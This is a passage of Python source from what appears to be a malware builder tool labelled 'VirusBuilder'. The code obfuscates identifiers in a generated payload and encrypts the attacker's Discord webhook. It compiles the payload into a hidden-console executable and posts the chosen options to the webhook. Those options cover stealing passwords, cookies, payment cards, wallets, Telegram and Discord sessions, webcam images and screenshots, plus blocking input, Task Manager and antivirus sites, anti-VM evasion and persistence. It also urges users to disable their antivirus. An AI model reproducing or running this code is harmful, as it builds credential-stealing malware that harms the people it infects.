                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    target.id = new_name

                    elif isinstance(node, ast.FunctionDef):
                        if "D3f_" in node.name: 
                            if node.name not in variable_map:
                                new_name = RandomName()
                                variable_map[node.name] = new_name
                                node.name = new_name 
                            for arg in node.args.args:
                                var_name = arg.arg
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    arg.arg = new_name

                    elif isinstance(node, ast.ClassDef):
                        if node.name not in variable_map and "v4r_" in node.name:
                            new_name = RandomName()
                            variable_map[node.name] = new_name
                            node.name = new_name

                    for child in ast.iter_child_nodes(node):
                        visit_node(child)

                tree = ast.parse(original_script)
                visit_node(tree)

                with open(file_python, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                with open(file_python, 'w', encoding='utf-8') as file:
                    for line in lines:
                        for var_name, new_name in variable_map.items():
                            if var_name in line:
                                line = line.replace(var_name, new_name)
                        file.write(line)


                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All the Identifiers of the python file were obfuscated.")
            except: pass

    def SendWebhook(webhook):
        embed_config = {
            'title': f'Virus Created (Config):',
            'color': color_webhook,
            "fields": [
                {"name": f"Name:",                   "value": f"""```{name_file}```""",                        "inline": True},
                {"name": f"Type:",                   "value": f"""```{file_type}```""",                        "inline": True},
                {"name": f"Webhook:",                "value": f"""{webhook}""",                                "inline": False},
            ],
            'footer': {
                "text": username_webhook,
                "icon_url": avatar_webhook,
                }
            }
        
        embed_stealer = {
            'title': f'Virus Created (Stealer):',
            'color': color_webhook,
            "fields": [
                {"name": f"System Info:",            "value": f"""```{option_system}```""",                    "inline": True},
                {"name": f"Wallets Session Files:",  "value": f"""```{option_game_launchers}```""",            "inline": True},
                {"name": f"Games Session Files:",    "value": f"""```{option_system}```""",                    "inline": True},
                {"name": f"Telegram Session Files:", "value": f"""```{option_apps}```""",                      "inline": True},
                {"name": f"Roblox Accounts:",        "value": f"""```{option_roblox}```""",                    "inline": True},
                {"name": f"Discord Accounts:",       "value": f"""```{option_discord}```""",                   "inline": True},
                {"name": f"Discord Injection:",      "value": f"""```{option_discord_injection}```""",         "inline": True},
                {"name": f"Passwords:",              "value": f"""```{option_passwords}```""",                 "inline": True},
                {"name": f"Cookies:",                "value": f"""```{option_cookies}```""",                   "inline": True},
                {"name": f"Browsing History:",       "value": f"""```{option_history}```""",                   "inline": True},
                {"name": f"Download History:",       "value": f"""```{option_downloads}```""",                 "inline": True},
                {"name": f"Cards:",                  "value": f"""```{option_cards}```""",                     "inline": True},
                {"name": f"Extentions:",             "value": f"""```{option_extentions}```""",                "inline": True},
                {"name": f"Interesting Files:",      "value": f"""```{option_interesting_files}```""",         "inline": True},
                {"name": f"Webcam:",                 "value": f"""```{option_webcam}```""",                    "inline": True},
                {"name": f"Screenshot:",             "value": f"""```{option_screenshot}```""",                "inline": True},
            ],
            'footer': {
                "text": username_webhook,
                "icon_url": avatar_webhook,
                }
            }
        
        embed_malware = {
            'title': f'Virus Created (Malware):',
            'color': color_webhook,
            "fields": [
                {"name": f"Block Key:",              "value": f"""```{option_block_key}```""",                 "inline": True},
                {"name": f"Block Mouse:",            "value": f"""```{option_block_mouse}```""",               "inline": True},
                {"name": f"Block Task Manager:",     "value": f"""```{option_block_task_manager}```""",        "inline": True},
                {"name": f"Block AV Website:",       "value": f"""```{option_block_website}```""",             "inline": True},
                {"name": f"Shutdown:",               "value": f"""```{option_shutdown}```""",                  "inline": True},
                {"name": f"Spam Open Program:",      "value": f"""```{option_spam_open_programs}```""",        "inline": True},
                {"name": f"Spam Create File:",       "value": f"""```{option_spam_create_files}```""",         "inline": True},
                {"name": f"Fake Error:",             "value": f"""```{option_fake_error}```""",                "inline": True},
                {"name": f"Launch At Startup:",      "value": f"""```{option_startup}```""",                   "inline": True},
                {"name": f"Restart Every 5min:",     "value": f"""```{option_restart}```""",                   "inline": True},
                {"name": f"Anti VM & Debug:",        "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
            ],
            'footer': {
                "text": username_webhook,
                "icon_url": avatar_webhook,
                }
            }
        
        requests.post(webhook, data=json.dumps({'embeds': [embed_config],  'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        requests.post(webhook, data=json.dumps({'embeds': [embed_stealer], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        requests.post(webhook, data=json.dumps({'embeds': [embed_malware], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        
    def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        if sys.platform.startswith("win"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python", "-m", "pip", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif sys.platform.startswith("linux"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")

        try:
            script_path = os.path.abspath(file_python)
            working_directory = os.path.dirname(script_path)
            os.chdir(working_directory)

            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]

            if icon_path:
                pyinstaller.extend(['--icon', icon_path])

            result = subprocess.run(pyinstaller, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.stderr:
                if "completed successfully" not in result.stderr:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + result.stderr}")
                    Continue()
                    Reset()
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")

            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                shutil.rmtree(os.path.join(working_directory, "build"))
                os.remove(os.path.join(working_directory, f"{name_file}.spec"))
                os.remove(file_python)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + str(e)}")
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + str(e)}")
            Continue()
            Reset()

    file_python_relative = f'1-Output\\VirusBuilder\\{name_file}.py'
    file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")

    path_destination_relative = "1-Output\\VirusBuilder"
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

    # File detected by the antivirus, but be aware that there is no backdoor
    from FileDetectedByAntivirus.VirusBuilderOptions import *

    key_encryption, webhook_encrypted = Encryption(webhook)
    PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
    PythonIdentifierObfuscation(file_python)

    if file_type == "Exe File":
        if not os.path.exists(path_destination):
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, reinstall the tool and try again.")
            Continue()
            Reset()
        
        if os.path.exists(file_python):
            if not os.path.exists(icon_path):
                ConvertToExe(file_python, path_destination, name_file)
            else:
                ConvertToExe(file_python, path_destination, name_file, icon_path)
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} The python file created previously was deleted, please remove your anti virus and try again.")

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} The virus was created, it is found in: {white + path_destination_relative}")
    try: os.startfile(path_destination)
    except: pass
    try: SendWebhook(webhook)
    except: pass
    Continue()
    Reset()
except Exception as e: 
    Error(e)